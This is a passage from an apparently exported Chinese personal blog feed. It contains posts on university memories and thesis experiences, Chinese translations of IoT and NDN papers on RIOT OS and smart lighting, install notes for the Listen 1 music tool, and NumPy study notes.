    <content type="text"><![CDATA[走过的路，见过的人；各有其因，各有其缘。 大学四年，临近毕业，好几次都有人问我，大学有什么遗憾吗？我都是很正经的回答了他们，因为，我真的没有认真思考过这个问题。 今天，无意间在手机的记事本中发现一个新浪博客的地址，点进去，原来是某位小姐姐的博客，还是当初我建议她写的。 翻了翻目录，发现一篇与我相关的，2016年2月的文章，很遗憾，现在才看到。 看完之后，有些感动，也突然觉得，大学四年还是有遗憾的。 当初，也是觉得感觉对了，所以想去试一试，但是，即使有过一段快乐的时光，也并未如愿。之后，也再没有找到过这样的感觉，不过，以后一定还是会有的。 或许这就是青春吧，至少，也曾追求过，不枉大学四年。 走过的路，见过的人；各有其因，各有其缘。 四年，也有人向我表白被我拒绝，或许，世界就是这样，我们都在做“贱人”，心里都装着一个自己喜欢的人，然后拒绝了喜欢你的人，或许也是缘分不够吧。 后来，很认真的思考过很多次，一直想要放弃却一直在挣扎，之后也有断断续续的联系，不过，后来慢慢被时间冲刷，也没有那么多深入的闲聊，慢慢地也就放弃了。如果不是这次看到这篇博客，或许也不曾想起这些事。 我的青春有你的脚印，只是我们未曾走远，说是缘分也好，说是遗憾也对，不管后来怎么样了，至少我们曾经一起开心过。嗯，就是这样的。 现在想想，其实，我们还是挺不合适的，只是聊得来。不过，还是谢谢你，我的小姐姐，谢谢曾经的陪伴，谢谢曾经的依赖，感谢曾经快乐的时光。愿你走向幸福的未来，愿你以后的朋友像我一样爱你。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]RIOT OS：Towards an OS for the Internet of Things]]></title>
    <url>%2F2017%2F06%2F15%2F%E8%AF%91-RIOT-OS%EF%BC%9ATowards-an-OS-for-the-Internet-of-Things%2F</url>
    <content type="text"><![CDATA[RIOT OS：Towards an OS for the Internet of Things（全文翻译） 123456789RIOT OS：Towards an OS for the Internet of ThingsEmmanuel Baccelli and Oliver HahmINRIA, FranceMesut Gunes and Matthias W ¨ ahlisch ¨Freie Universitat Berlin, Germany ¨Thomas C. SchmidtHAW Hamburg, German 摘要：物联网（IoT）的特点是异构设备。它们包括由8位微控制器（MCU）提供的非常轻量的传感器到配备更强大但节能32位处理器的设备。目前在互联网主机上运行的传统操作系统（OS）和传感器网络的典型操作系统都不能满足这种广泛设备的多样化需求。为了利用物联网，应避免冗余开发，降低维护成本。在本文中，我们重新审视了物联网中操作系统的要求。我们介绍RIOT OS，这是一个明确考虑到最少资源的设备的操作系统，但是可以在各种设备上进行开发。 RIOT OS允许标准的C和C ++编程，提供多线程以及实时功能，并且只需要至少1.5 kB的RAM。 引言 十亿个异构设备，例如传感器节点，家用电器，智能手机和车辆等预计将通过自发无线网络或电力线通信互连，从而产生物联网。然而，这样的设备虽然在计算能力，可用存储器，通信和能量容量方面受到极大限制，但是预期将满足物理系统（i）可靠性，（ii）实时性，以及（iii） 自适应通信堆栈与互联网无缝集成的要求。 用于IoT设备的操作系统应满足这些要求，并可在广泛的硬件上运行，从基于低功耗MCU的节点到由新一代节能32位处理器供电的节点。现有的任何一个操作系统-既不是一个轻量级的针对无线传感器网络（WSN）的操作系统，也不是全面的操作系统-都能够满足多样化的需求。因此，为了避免重复的开发和维护成本，需要一个新的统一类型的操作系统，这是这篇论文的主题。 问题陈述： 理想情况下，所有IoT设备都应提供完整操作系统的功能。以下将重点介绍Linux的特点，因为它是主要的完整操作系统中的开源操作系统的一个很好的例子。与典型的面向WSN的轻量级操作系统相比，Linux更易于开发人员使用：许多可用的系统库，网络协议或算法，以及开发人员可以使用标准C或C++编码的近似学习曲线。然而，Linux在CPU和内存方面的最低要求不符合由小型MCU供电的受限制的IoT设备。虽然努力尝试使其符合这些要求，但我们认为，Linux并没有为物联网设计，并且不能实现严格的能源效率。由于这些原因，Linux不能被期望成为在IoT中统治它们全部的一个操作系统。 另一方面，使得能够在最受约束的IoT设备上运行的典型的轻量级操作系统的WSN的权衡使其显着降低了开发人员的便利性，并且在更强大的IoT设备上使用它将导致更少的能效实现，而不是利用设备的全部功能。主要的WSN操作系统，Contiki和TinyOS遵循事件驱动设计，这对于典型的WSN场景是有用的，但是对于高效和功能性的网络实现来说，它们具有缺点。例如，在典型的WSN场景中，循环中顺序地处理任务就足够了，但是由于受限的内存，这些限制了窗口大小为至多一个TCP连接。一种替代的系统架构是可取的，它提供了一个现代的，成熟的操作系统的功能，如本地多线程，硬件抽象，动态内存管理。然而，迄今为止，这些类型的系统被认为对于IoT设备来说太复杂。 RIOT-针对互联网上更小事物的的操作系统 物联网操作系统设计方面： 从根本上说，OS的特征在于以下关键设计方面：内核的结构，调度程序和编程模型。内核可以（i）以单片方式构建，（ii）遵循分层方法，或（iii）实现微内核架构。调度策略的选择与实时支持（或缺乏），不同任务优先级的支持或用户交互的支持度密切相关。最后，编程模型定义（i）所有任务是否在相同的上下文中执行，并且没有内存地址空间的分段，或者（ii）每个进程都可以在自己的线程中运行并具有自己的内存堆栈。编程模型也与应用程序开发人员可用的编程语言相关联。 比较现有解决方案： 基于这些观察，我们比较了Contiki，Tiny OS和Linux，我们为IoT的OS提供了第一个原则。Contiki遵循接近分层方法的模块化概念，而Tiny OS由单核内核组成，就像Linux。Contiki中的调度是纯事件驱动的，类似于TinyOS中使用FIFO策略的调度。另一方面，Linux使用调度器，这保证了处理时间的公平分配。Contiki和TinyOS中的编程模型基于事件驱动模型，即所有任务都在同一上下文中执行，尽管它们提供了部分多线程支持。Contiki使用C编程语言的一部分，其中一些关键字不能使用，而TinyOS是用C语言的方言编写的，名为nesC。 另一方面，Linux支持真正的多线程，以标准C编写，并支持各种不同的编程和脚本语言。由于这些设计的权衡，TinyOS和Contiki因此缺乏几个关键的开发友好功能：标准的C和C++可编程性，标准的多线程和实时支持（见表一）。一个促使一个成功的大规模部署的IoT设备转变的操作系统应该支持这些功能。从开发人员的角度来看，这意味着一个强大的，与硬件无关的API。 RIOT体系结构概述：RIOT操作系统旨在弥合我们观察到的在WSN操作系统与目前在互联网主机上运行的传统完整操作系统之间的差距。它基于的设计目标，包括能源效率，小内存占用，模块化和统一的API访问，独立于底层硬件。 RIOT实现了从FireKernel继承的微内核架构，从而支持使用标准API的多线程。 除了FireKernel的原始功能之外，RIOT增加了对C++的支持 - 支持强大的库，如Wiselib算法框架，并提供了一个TCP/IP网络堆栈。因此，RIOT架构的优点包括：（i）高可靠性和（ii）开发者友好的API。RIOT的模块化微内核结构使其可以抵御单个组件中的错误。例如，设备驱动程序或文件系统中的故障不会损害整个系统。RIOT允许开发人员根据需要创建尽可能多的线程，并且可以通过使用内核消息API轻松实现分布式系统。线程的数量只受每个线程的可用内存和堆栈大小的限制，而计算和内存开销是最小的。 RIOT技术细节：为了实现强大的实时要求，RIOT为内核任务（例如，调度程序运行，进程间通信，定时器操作）实施恒定周期。保证运行时间O(1)的一个重要先决条件是在内核中独占使用静态内存分配。然而，动态内存管理被提供给应用程序。我们通过使用固定大小的循环链表来实现调度程序的不间断运行。通过利用MCU通常提供多个比较寄存器的事实来获得定时器操作的恒定运行时间。 在深度睡眠模式下最大限度地延长使用寿命，为了实现更强大的IoT设备的能源效率，RIOT因此引入了一个没有任何周期性事件的调度器。 每当没有挂起的任务时，RIOT将切换到空闲线程，这取决于正在使用的外围设备确定最深可能的睡眠模式。只有中断（外部或内核生成）才能使系统从空闲状态唤醒。 内核功能的低复杂度是OS的能源效率的主要因素。因此，上下文切换的持续时间和发生必须最小化。在RIOT中，上下文切换在两种情况下执行：（i）相应的内核操作本身被调用，例如互斥锁定或新线程的创建，或者（ii）中断引起线程切换。第一种情况很少发生。例如，每个线程通常创建一次。 因此，重要的是在线程切换的情况下减少处理时间。因此，当RIOT的内核从中断服务程序中被调用时，它提供了一个最小化的调度程序。在这种情况下，不需要保存旧线程的上下文，因此可以在非常少的时钟周期内执行任务切换 可用的代码和未来的工作 尽管这种复杂的架构和高效的调度，RIOT具有较低的内存占用。例如，可用的开源RIOT代码需要少于5kBy的ROM和小于1.5 kByte的RAM，用于MSP430上的基本应用程序。RIOT使用多线程编程模型与标准ANSI C代码和所有支持的硬件（从16位微控制器到32位处理器）的普通POSIX类API组合。因此，对于涉及异构IoT硬件的项目，可以在RIOT上构建整个软件系统，并轻松采用现有的库。此外，包括将受限系统连接到互联网（6LoWPAN，RPL）的IETF的最新标准的几种网络协议的可用性使得RIOT IoT准备就绪。正在进行的工作包括完整的POSIX合规性和移植到各种IoT平台。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>NDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜歌，听歌，就用 Listen 1]]></title>
    <url>%2F2017%2F06%2F14%2F%E6%90%9C%E6%AD%8C%EF%BC%8C%E5%90%AC%E6%AD%8C%EF%BC%8C%E5%B0%B1%E7%94%A8-Listen-1%2F</url>
    <content type="text"><![CDATA[随着音乐的正版化，我们常常因为歌曲版权而不得不穿梭于各个音乐平台之间，比如我很喜欢网易云音乐，可是网易云音乐中林宥嘉的很多歌曲都无法收听，所以不得不到其他平台去找，总之，非常麻烦。现在，推荐给你的是一站式音乐搜索与播放工具Listen 1，搜歌，听歌，就用 Listen 1。 简介 Listen 1 是一个用Python语言开发的免费开源综合音乐搜索工具项目，它可以用来搜索并播放来自网易云音乐，虾米，QQ音乐三个主流音乐网站的歌曲以及收听精选音乐歌单，让你的曲库更加全面。目前，Listen 1已经提供Windows和Mac系统的桌面版以及Chrome和Firefox浏览器插件版本。 Listen 1提供“精选歌单”、“我的歌单”、“快速搜索”以及“关于”四个功能模块。 官方网站：http://githublisten1.coding.me/listen1/ Github仓库： https://github.com/listen1 桌面版安装 进入官网下载： 官方网站：http://githublisten1.coding.me/listen1/ 注意：如果使用浏览器下载较慢，请复制下载链接使用迅雷下载。 Google浏览器-Chrome安装推荐下载浏览器插件版本，安装方便快捷，使用也很简单。 下载项目的zip文件，在右上方有个 clone and Download，选择Download ZIP，然后 解压到本地。下载地址：http://githublisten1.coding.me/listen1/ 打开chrome浏览器，点击右上角的设置按钮下找到更多工具，打开扩展程序，然后勾选打开页面上方的开发者模式。 点击加载已解压的扩展程序，选中刚刚解压后的文件夹即可。 点击chorme右上角Listen 1的图标即可打开它。 Firefox浏览器打包安装 打包xpi文件（或在release页面下载已经打包好的xpi文件） 将根目录下manifest_firefox.json替换manifest.jsoncd listen1_chrome_extensionzip -r ../listen1.xpi *安装 打开Firefox，加载xpi文件，完成安装 使用体验 界面简洁，没有太多的花俏，功能没有专业的音乐播放器强大，但是基本功能都有，用户体验还不错。 搜索功能强大，搜歌、听歌方便快捷，但是目前还不支持歌曲下载。 不支持用户注册登录，重装插件或清除缓存数据会导致我的歌单数据丢失，但是它提供歌单备份功能，也支持歌单导入进行数据恢复。 最后，向Listen 1的作者致敬，感谢分享感谢开源，希望这个工具能够一直走下去。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>软件</tag>
        <tag>工具</tag>
        <tag>Listen 1</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从毕业设计看如今的大学]]></title>
    <url>%2F2017%2F06%2F06%2F%E4%BB%8E%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1%E7%9C%8B%E5%A6%82%E4%BB%8A%E7%9A%84%E5%A4%A7%E5%AD%A6%2F</url>
    <content type="text"><![CDATA[博客已经一个月没有更新，这个月里，认真完成了自己的毕业设计，也帮助了其他几位同学完成毕业设计，这期间积累了很多值得用博客来记录的东西，不管是关于技术的还是关于生活的都让我觉得这个月过得很充实。 按照官方的说法：毕业设计是教学过程的最后阶段采用的一种总结性的实践教学环节。通过毕业设计，学生可以综合应用所学的各种理论知识和技能，进行全面、系统、严格的技术及基本能力的练习。 作为大学最后的考核，本来应该要求认真完成，可是，直到最后我才意识到这与我想象的毕业设计真的不一样。最近看到几篇微信推送，比如《本科生毕业设计那件小事》，这几篇微信推送想要表达的大都是学生对自己的毕业设计不负责，还得老师来催。 但是，就我自己的亲身经历，我感觉并不全是这样的。虽然，确实存在着老师比学生还着急的情况，但是，至少，在我们学校，大家都还是怕毕业设计不能过，然后都还是按照老师的要求在做。只是，不同的老师的要求不一样，不同的学生对于毕业设计的认真程度有差别，比如有的老师在外面开公司，一直是通过微信与学生进行联系，只是答辩的时候出现了一下，以至于对于学生毕业论文的要求没有明确，学生也觉得老师无所谓，所以也就没有重视起来。现在的学校了有一部分不作为的老师，他们总认为不是自己不想教学生，而是学生不行，或者学生态度差，可是，他们也不想想自己到底做了多少，是否真心实意想要教好学生，还是只是为了拿工资，然后外出去赚钱。每个老师都有来自家庭的压力，需要赚钱养家，这都是可以理解的，但是此外，你有没有认真的备课，认真地在带过学生，还是已经丢弃了自己作为老师的基本素质。 不过多的吐槽大环境了，毕竟我现在也改变不了什么，还是说说自己的毕业设计吧。自从去年获得推免资格，并确定好导师后就向导师表达了要过去做毕业设计的意愿，导师的意思也是希望我能够通过毕业设计对研究生期间的研究打下基础，所以很快就在导师的建议下确定了毕设的题目：基于6LoWPAN的智能家居系统的设计于是实现。 毕业设计和自己即将开始的研究生期间的研究方向有关，并且是在即将就读研究生的学校完成的，本科的指导老师和研究生的导师对我的毕业设计都给出了很多有意义的建议，并且在做毕设期间还得到了研究生师兄师姐以及博士师兄的支持和帮助。 毕业设计分为三步进行，前期主要进行资料查阅，方案对比与缺点，中期主要进行方案的实现与测试，后期则主要进行论文的撰写。由于之前只是对简单的51单片机有所学习，还没有进行过深入的学习，所以毕业设计对我来说也是充满了挑战。 几个月的毕业设计，自己觉得确实收获不少，临近答辩的那段时期，每天晚上都是凌晨1点睡，一步步完善自己的设计，修改论文。答辩前一天也是修改PPT到很晚，虽然到最后也还是有一些问题，但至少自己觉得没有辜负大学四年。不是说我每天都在做毕设就一定做得多好，只是我觉得我的态度比一些老师更端正。 而最让我感到绝望的是毕业设计答辩，老师对于你的设计并不懂，但是他们有没有耐心去听你的描述。答辩是要求做PPT的，但是基本上都不需要你讲毕业设计的背景以及所涉及的技术，而是直接演示效果，虽然，有一部分或许是由于自己描述得不是太让人感兴趣，但是老师们的态度实在让我失望，他们本来对我这个方向并不了解，对我使用的技术也并不清楚，但是却不愿意去听。几十个人的答辩，都要求一天之内搞完，有的甚至希望是半天就要搞完，你们的时间真的如此宝贵吗？我不知道这样的答辩意义何在。虽然也听说有极少数的班级答辩很严，这是我希望看到的，而且很多人答辩完之后还是很感谢这些要求严格的老师，但是其他基本上大部分其实都已经沦为一种形式，大家只不过都在配合演出罢了。 第一次体会到做科研的孤独，自己辛辛苦苦做出来，却得不到几个人的认可，关键是别人根本不愿意听。总听说，隔行如隔山，但是，现在即使没有隔行也感觉大家挺遥远的，这也让对于即将到来的研究生生活思考了很久，同一学科也有很多研究方向，今后该何去何从呢。 后来，毕设的成绩也让一些同学感到绝望，自己辛辛苦苦写代码写论文，却敌不过别人从网上找一个项目或者直接买一份得到的成绩高。不禁想问，我们的大学到底怎么了？记得北大钱理群教授说过的精致的利己主义者，这种不公平让投机者欢喜，却浇灭了那些踏踏实实做事的人的理想。 面对现实的种种，我对于如今国内一些大学的教育是失望的，因为到最后，教出来的竟然是只会弄虚作假的学生，可想而知他们今后走向社会，也难怪现在的人越来越现实了，或许我也是个理想主义者，只是，我也改变不了什么。 还好，来到新的学校，我的毕设得到的研究生期间导师的肯定，这份肯定对我来说是很重要的，这让我明白，我还可以继续为了理想而努力奋斗下去，期待三年之后不一样的自己。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Named Data Networking Based Smart Home Lighting]]></title>
    <url>%2F2017%2F05%2F05%2F%E8%AF%91-Named-Data-Networking-Based-Smart-Home-Lighting%2F</url>
    <content type="text"><![CDATA[Named Data Networking Based Smart Home Lighting（全文翻译） 基于命名数据网络的智能照明系统 1234567891011121314151617181920Named Data Networking Based Smart Home Lighting基于命名数据网络的智能照明系统Upeka De SilvaAsian Institute ofTechnology,Thailandst116384@ait.asiaAdisorn LertsinsrubtaveeUniversity of Cambridgeal773@cam.ac.ukArjuna SathiaseelanUniversity of Cambridgeas2330@cam.ac.ukKanchana KanchanasutAsian Institute ofTechnology, Thailandkanchana@ait.asia 引言 物联网（IoT）目前的势头正在鼓励科学界和行业界将目前的基于仓库的物联网平台模型发展成为一个全球统一的物联网平台-一个能够有效支持50-100亿网络对象的平台。为了应对这一挑战，出现了几个提议，例如建立覆盖在今天的以主机为中心的互联网之上的统一的以主机为中心的物联网平台。或者，网络社区建议使用信息中心网络（ICN），如NDN（命名数据网络）来应对挑战。NDN使用基于名称的路由在简单的有状态转发平面中传送数据包。它为开发人员在命名，安全性，缓存和固有多播支持方面提供了极大的灵活性。它避免了依赖于独立协议和IoT网络中使用的各种中间件。 在本文中，我们使用NDN提供家庭智能照明系统的初步评估，并展示了使用ICN模式来满足IoT挑战的一些优势。我们开发了一个原型，并将其与基于IP云的方法进行了对比。 NDN智能照明解决方案 NDN使用两种类型的数据包：Interest和Data来实现基于有状态转发平面的请求/响应架构，两种数据包都提供了类似URI的名称。天然支持组播传送，并且基于名称转发Interest包，随后聚合并复制对应的Data包。数据包是自我描述和自我保护的，这使得它们能够被缓存和重用。从数据位置解耦数据检索可实现分散的，有效的，可扩展和安全的内容分发模型。 我们的架构如图1所示，家庭路由器，一个连接所有IoT设备的无线路由器；智能控制器，一个具有无线接口（802.11g）的IoT平台；灯节点：通过一个执行器连接到一个智能控制器的普通灯泡，它可以远程切换灯泡开关。占用检测器：一种运动传感器，用于跟踪人员进出房间的动作。光度检测器：用于测量勒克斯灯光亮度的光传感器。智能家居控制器：在智能控制器上运行的智能家居应用程序，可根据房间占用和日光来控制灯光。我们分别使用Raspbian Wheezy和OpenWrt 12.09配置了树莓派和家庭路由器。NDN转发进程二进制数用于启用NDN功能。我们使用PyNDN客户端库开发了Python中的最终应用程序。 NDN基于推送的通信机制：NDN本质上支持基于拉式的通信。然而，在像智能照明这样的一些应用中，基于推送的数据传送更合适。占用检测器使用推送发送关于检测到的运动的数据并传播测量的光照水平。数据是一个20字节的字符串直接附加在Interest包中被发送，这种方法被称为Interest通知。图2显示了基于名称路由的光照强度检测器和光照强度监视器之间的消息流程示例。光照强度检测器每五秒钟测量一次光线，并将包含光照强度值和时间戳的Interest通知推送到智能控制器，该智能控制器通过静态路由向家用路由器注册名称前缀，以接收此类通知。 基于名字的多播：我们的解决方案通过使用聚合命名空间从NDN的固有组播通信中获益。单个Interest就包足以将任务命令给多个设备。例如，名为/home/light/floor1/的Interest包将被在floor1和switch off发布了相同名字的每个节点接收。 FIB优化：NDN使用称为转发兴趣库（FIB）的数据结构作为记录输出接口与名称匹配的路由表。为了扩大规模，我们通过在本地代理使用Interest过滤器以他们的内部NDN名字过滤匹配的Interest包来优化FIB。这样做的效果是单个FIB条目足以使节点捕获具有多个匹配层次结构的Interest。 初步结果 我们将系统与NetPie进行了比较，NetPie是一个本地云平台，拥有自己的即时消息系统，支持MQTT协议和HTTP RESTful API。为了将我们的平台连接到NetPie，我们为每个设备实现了客户端模块，并将其注册到NetPie服务器。我们使用匹配的身份和应用程序标识（home）来配置模块，以便他们可以按类似URI的主题名称认证和发布数据。我们关注消息传送延迟的评估：从生产者传递到消费者的消息所花费的时间。图3显示了在NDN和云方式下的光照强度检测器和智能家居控制器之间的消息传送延迟的CDF。使用云端时，我们通过从家庭路由器ping云服务器，并分别测量了互联网传输开销延迟（ITOD），估计大约为70ms。我们从消息传输延迟中扣除了这个开销，以模拟本地运行的云。 该图显示，在NDN和云中，85%的消息分别以小于23ms和142ms的延迟发送。当从云方法中扣除互联网传输开销时，85%的消息在不到72ms内传输。这表明即使云在本地托管，由于处理开销及其协议栈，延迟仍高于NDN。延迟降低在诸如智能照明的应用中是重要的，以确保实时响应和同时控制灯组。使用云，多个消费者可以通过订阅相关主题来接收亮度消息，而在NDN下，多个消费者可以通过注册家庭路由器的FIB中的相关名称前缀来订阅光照强度的Interests通知。由于NDN的组播转发功能，所有消费者可以同时接收到兴趣通知。相比之下，NDN比基于云的平台提供了更高的性能和更大的灵活性。当流量是本地时，这是特别有用的。 参考文献： [1] M. Amadeo, et al. Internet of things via named data networking: The support of push tra!c. In Network of the Future, 2014. [2] V. Jacobson, et al. Networking named content. In ACM CoNEXT, 2009. [3] Y. Zhang et al. Requirements and Challenges for IoT over ICN. IRTF-Draft, 2016.]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>NDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Numpy学习笔记（二）]]></title>
    <url>%2F2017%2F04%2F28%2FPython-Numpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Python Numpy学习笔记第二篇。目前，正在学习北京理工大学嵩天老师在中国大学MOOC的课程：Python数据分析与展示。 ndarray数组的操作索引和切片索引：获取数组中特定位置元素的过程 切片：获取数组元素子集的过程 一维数组的索引和切片 123456789&gt;&gt;&gt; a = np.array([1, 2, 3, 4, 5, 6])&gt;&gt;&gt; a[2]3&gt;&gt;&gt; a[-2] # 从右开始5&gt;&gt;&gt; a[1:4] # 起始编号:终止编号(不含):步长array([2, 3, 4])&gt;&gt;&gt; a[0:6:2] # 指定步长为2array([1, 3, 5]) 多维数组的索引和切片 1234567891011&gt;&gt;&gt; a = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; aarray([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; a[1, 2]6&gt;&gt;&gt; a[-1,-2] # 从右开始5# 选取一个维度用:，不同维度用逗号分开&gt;&gt;&gt; a[:1, 1:] # 每个维度切片方法与一维数组相同array([[2, 3]]) 基本运算 一元函数 函数 说明 np.abs(x) np.fabs(x) 计算数组各元素的绝对值 np.sqrt(x) 计算数组各元素的平方根 np.square(x) 计算数组各元素的平方 np.log(x) np.log10(x) np.log2(x) 计算数组各元素的自然对数、10底对数和2底对数 np.ceil(x) np.floor(x) 计算数组各元素的ceiling值 或 floor值 12345678910111213141516171819&gt;&gt;&gt; a = np.array([-2, 4, 6])&gt;&gt;&gt; np.abs(a)array([2, 4, 6])&gt;&gt;&gt; aarray([-2, 4, 6])&gt;&gt;&gt; np.fabs(a)array([ 2., 4., 6.])&gt;&gt;&gt; b = np.square(a)&gt;&gt;&gt; barray([ 4, 16, 36])&gt;&gt;&gt; np.sqrt(b)array([ 2., 4., 6.])&gt;&gt;&gt; np.log2(b)array([ 2. , 4. , 5.169925])&gt;&gt;&gt; a = np.array([0.2, 1.5, 2.8])&gt;&gt;&gt; np.ceil(a)array([ 1., 2., 3.])&gt;&gt;&gt; np.floor(a)array([ 0., 1., 2.]) 函数 说明 np.rint(x) 计算数组各元素的四舍五入值 np.modf(x) 将数组各元素的小数和整数部分以两个独立数组形式返回 np.cos(x) np.cosh(x) 计算数组各元素的普通型和双曲型三角函数 np.sin(x) np.sinh(x) 计算数组各元素的普通型和双曲型三角函数 np.tan(x) np.tanh(x) 计算数组各元素的普通型和双曲型三角函数 np.exp(x) 计算数组各元素的指数值 np.sign(x) 计算数组各元素的符号值，1(+),0,‐1(‐) 二元函数 函数 说明 +, ‐, , /, * 两个数组各元素进行对应运算 np.maximum(x,y) np.fmax() 元素级的最大值/最小值计算 np.minimum(x,y) np.fmin() 元素级的最大值/最小值计算 np.mod(x,y) 元素级的模运算 np.copysign(x,y) 将数组y中各元素值的符号赋值给数组x对应元素 &gt;, &lt;, &gt;=, &lt;=, ==, != 算术比较，产生布尔型数组 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; a = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; b = np.array([[1, 2, 3],[4, 5, 6]])&gt;&gt;&gt; a + barray([[ 2, 4, 6], [ 8, 10, 12]])&gt;&gt;&gt; a - barray([[0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; a * barray([[ 1, 4, 9], [16, 25, 36]])&gt;&gt;&gt; a / barray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a**2array([[ 1, 4, 9], [16, 25, 36]])&gt;&gt;&gt; np.maximum(a, b)array([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; np.fmax(a, b)array([[1, 2, 3], [4, 5, 6]])&gt;&gt;&gt; np.mod(a, b)array([[0, 0, 0], [0, 0, 0]])&gt;&gt;&gt; a &gt;= barray([[ True, True, True], [ True, True, True]], dtype=bool) ndarray数组的变换维度变换 方法 说明 .reshape(shape) 不改变数组元素，返回一个shape形状的数组，原数组不变 .resize(shape) 与.reshape()功能一致，但修改原数组 .swapaxes(ax1,ax2) 将数组n个维度中两个维度进行调换 .flatten() 对数组进行降维，返回折叠后的一维数组，原数组不变 1234567891011121314151617181920212223&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a = np.ones((2,6))&gt;&gt;&gt; aarray([[ 1., 1., 1., 1., 1., 1.], [ 1., 1., 1., 1., 1., 1.]])&gt;&gt;&gt; a.reshape((3,4))array([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]])&gt;&gt;&gt; aarray([[ 1., 1., 1., 1., 1., 1.], [ 1., 1., 1., 1., 1., 1.]])&gt;&gt;&gt; a.resize((3,4))&gt;&gt;&gt; aarray([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]])&gt;&gt;&gt; a.flatten()array([ 1., 1., 1., 1., 1., 1., 1., 1., 1., 1., 1., 1.])&gt;&gt;&gt; aarray([[ 1., 1., 1., 1.], [ 1., 1., 1., 1.], [ 1., 1., 1., 1.]]) 类型变换astype()方法一定会创建新的数组（原始数据的一个拷贝），即使两个类型一致。 12345678910&gt;&gt;&gt; a = np.ones((2,3), dtype=np.int32)&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a.astype(np.float)array([[ 1., 1., 1.], [ 1., 1., 1.]])&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]]) 转换成列表tolist()方式可以实现将ndarray数组转换成列表。 123456&gt;&gt;&gt; a = np.ones((2,3), dtype=np.int32)&gt;&gt;&gt; aarray([[1, 1, 1], [1, 1, 1]])&gt;&gt;&gt; a.tolist()[[1, 1, 1], [1, 1, 1]]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]The Design and Implementation of the NDN Protocol Stack for RIOT-OS]]></title>
    <url>%2F2017%2F04%2F20%2F%E8%AF%91-The-Design-and-Implementation-of-the-NDN-Protocol-Stack-for-RIOT-OS%2F</url>
    <content type="text"><![CDATA[The Design and Implementation of the NDN Protocol Stack for RIOT-OS（全文翻译） RIOT-OS的NDN协议栈的设计与实现 123Wentao Shang, Alex Afanasyev, and Lixia ZhangComputer Science Department, UCLAEmail: &#123;wentao,aa,lixia&#125;@cs.ucla.edu 摘要：命名数据网络（NDN）架构已经作为一个支持物联网环境中的通信的有前途的解决方案被提出。IoT平台的一个重要类别是受限制的设备，其计算资源有限，并且通过受限得网络连接在一起。本文介绍了RIOT-OS的NDN协议栈的设计和实现，RIOT-OS是一个受限制IoT平台的流行的操作系统。我们成功地将核心NDN数据包转发逻辑与数据安全支持的高级应用接口一起集成到RIOT-OS内核中。我们的研究结果证明了使用NDN协议栈来支持只有10s的RAM和闪存的受限设备上的应用的可行性。 引言 近年来，物联网技术得到了迅猛的发展，业界和学术界对这一领域的兴趣都在持续增长。IoT系统可以互连大量传感器和执行器，并允许用户远程访问各种类型的数据和控制功能。 命名数据网络已作为一种有前景的解决方案被提出来在联网层面支持IoT语义，简化异构网络的运行，使得大量的传感器数据可以更便捷的被应用程序得到，并实现数据为中心的安全检测数据和启动命令。 IoT设备的一个重要类别是受限制的设备，具有有限的内存，低处理能力和低功耗网络接口。这些功能使得IoT技术成本低廉并且可以使用电池供电工作多年，但是同时也提出了NDN协议栈如何适应这种受限环境的问题。有一种观点认为，NDN的转发逻辑太复杂，无法在受限设备上实现，或者以数据为中心的安全机制对于受约束的IoT应用来说太昂贵了。 本文通过介绍RIOT-OS上的NDN协议栈的设计和实现来解决上述问题，RIOT-OS是一种为受约束的IoT平台而设计的流行的操作系统。RIOT-OS通过开发人员友好的编程接口提供了跨多个受限平台的硬件细节的统一抽象。它已经支持许多受欢迎的IoT开发板，内置驱动器，用于许多外围IoT传感器，包括湿度和温度传感器，光传感器，气表，加速度计等。可以用来实现大量的现实应用。 我们把我们的实现称之为NDN-RIOT，它将核心的NDN转发逻辑集成到RIOT内核并且支持直接在IEEE 802.15.4低速率无线网络接口上进行NDN通信，该接口在支持RIOT-OS的设备上广泛使用，像传统以太网一样。尽管受到限制环境的限制，NDN-RIOT仍然通过有限的签名类型（HMAC和ECDSA）提供了以物联网数据为中心的数据认证安全特性的基础。我们的演示应用程序可以在32KB的内存中运行，只需要大约40KB的闪存来存储整个程序（包括应用程序代码和OS内核）。我们在GitHub上免费提供NDN-RIOT源代码，我们非常欢迎广大社区的意见，功能要求和帮助。 本文的其余部分组织如下：第二部分简要回顾了NDN架构和RIOT-OS系统;第三节介绍NDN-RIOT的软件设计;第四节介绍了关注系统内存使用和性能的评估结果;第五节回顾了有关受限设备的网络堆栈实现的相关工作;最后，第六部分总结了论文并阐述了未来的工作。 背景命名数据网络 